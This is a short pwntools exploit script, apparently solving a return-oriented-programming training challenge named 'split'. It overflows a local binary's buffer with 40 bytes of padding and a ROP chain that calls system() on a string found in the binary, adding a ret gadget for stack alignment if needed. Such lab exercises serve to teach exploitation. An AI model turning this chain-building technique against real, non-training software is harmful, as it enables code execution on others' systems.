from pwn import *

context.terminal = "alacritty", "-e"
context.binary = "./split"
e = ELF("./split")


def exploit(pad: bool = False) -> str:
    r = ROP(e)
    p = process()
    if pad:
        r.call(r.ret)
    r.system(e.symbols["usefulString"])
    log.info(f"chain:\n{r.dump()}")
    p.send(b"A" * 8 * 5 + r.chain())
    return p.recvline_regex(rb".*{.*}.*").decode("ascii")


try:
    log.success(exploit())
except EOFError:
    log.failure("Stack alignment is needed, adding a ret to the chain...")
    log.success(exploit(True))
